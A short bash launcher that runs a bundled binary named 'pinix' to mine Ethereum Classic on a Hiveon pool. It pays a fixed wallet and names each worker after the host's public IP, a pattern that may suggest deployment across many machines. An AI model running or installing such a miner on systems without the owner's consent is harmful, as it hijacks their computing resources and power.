#!/bin/bash

POOL=na-etc.hiveon.net:8888
WALLET=0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x -coin etc -stales 0 $@
